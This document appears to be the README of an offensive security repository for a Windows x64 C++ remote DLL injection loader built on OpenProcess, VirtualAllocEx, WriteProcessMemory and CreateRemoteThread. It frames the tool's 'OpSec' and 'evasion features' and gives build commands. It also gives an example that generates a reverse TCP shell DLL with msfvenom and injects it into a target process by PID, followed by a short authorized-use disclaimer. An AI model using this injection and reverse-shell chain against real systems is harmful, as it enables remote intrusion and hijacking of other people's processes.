# dll_injection
```
Classic remote DLL injection sample for Windows x64 using OpenProcess, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread.
```
## Overview

- **Target OS:** Windows
- **Architecture:** x64
- **Language:** C++
- **Type:** Loader / DLL Injection Utility

## Key Capabilities & OpSec

- **Evasion Features:** Remote memory staging, LoadLibraryA thread start
- **Execution Model:** Remote thread DLL loading
- **Dependencies:** Win32 API only

## Compilation & Usage

### Prerequisites
```bash
- x86_64-w64-mingw32-g++
- wine (optional)
```

### Build Commands
```bash
x86_64-w64-mingw32-g++ dll_injection.cpp -o dll_injection.exe -luser32 -lkernel32 -static -std=c++26
```

### Example
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o mylib.dll
wine dll_injection.exe <PID> mylib.dll
```

## Workspace Extraction & Clean Checkout
```bash
git clone --filter=blob:none --no-checkout <REPOSITORY_URL>
cd <REPO_FOLDER>
git sparse-checkout init --cone
git sparse-checkout set "dll_injection"
git checkout
rm -rf .git
```

## Disclaimer

Educational and authorized security testing only.
